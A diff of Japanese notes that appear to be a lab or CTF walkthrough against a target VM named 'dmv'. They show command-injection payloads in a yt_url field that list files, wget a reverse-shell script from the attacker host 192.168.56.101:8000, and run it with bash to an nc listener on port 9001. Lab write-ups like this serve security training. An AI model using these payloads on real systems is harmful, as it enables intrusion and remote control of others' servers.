@@ -21,12 +21,15 @@
   - postのボディ部分のyt_url=のところに`` --exec%3c`ls${IFS}-la` ``を入力するとResponseにコマンドの結果であるディレクトリの一覧がパーミッションと一緒に返ってくる
     - `${IFS}`はbashでのスペース、`%3c`はURLエンコーダのスペース
     - ここではバッククォートが使われているが、シングルやダブルクォートの違いはシングルなどは文字列に対して、バッククォートはコマンドを一つの塊にしたもの
-- reverse-shellで侵入
-  - ここでreverse-shellのファイルを置いて、reverse-shellをする。普段なら、リバースシェルのコードを実行させるが、なぜかできないので、リバースシェルを書いたファイルをuploadして、そのファイルをもう一度実行させる
-  - Parrotでvimでfile.shを作る`import socket,subprocess~`を貼り付けて、ターゲット側で受け取る
-  - postのボディ部分のyt_url=のところに`` --exec%3c`wget${IFS}http://192.168.56.101:8000/file.sh` ``を入力する
+- reverse-shellで侵入(説明)
+  - reverse-shellのコードを書いたファイルをターゲット(dmv)に置いて、reverse-shellをする。普段なら、リバースシェルのコードをURLに書き込んで実行させるが、なぜかできないので、リバースシェルを書いたファイルをuploadして、そのファイルをもう一度実行させる
+  - ポートが2つ出てくるので、整理しておくと、reverse-shellのポートは9001を使う。Parrotからターゲットにfile.shを送るポートには8000を使う
+- reverse-shellで侵入(実行)
+  - Parrotでvimでfile.shを作る`import socket,subprocess~`を貼り付ける。コードの中のポートは9001にしておく
+  - ターゲット側からParrotの8000ポートを利用してfile.shを取得する。リクエストのボディ部分のyt_url=のところに`` --exec%3c`wget${IFS}http://192.168.56.101:8000/file.sh` ``を入力して、これ以外の余計な部分は削除する。sendボタンを押す。
   - parrotで待ち受ける
-  - postのボディ部分のyt_url=のところに`` --exec%3c`bash${IFS}file.sh` ``を入力する
+    - `nc -nlvp 9001` 
+  - postのボディ部分のyt_url=のところに`` --exec%3c`bash${IFS}file.sh` ``を入力して、sendボタンを押すとシェルが使える
 
 - id
   - www-dataのみ 
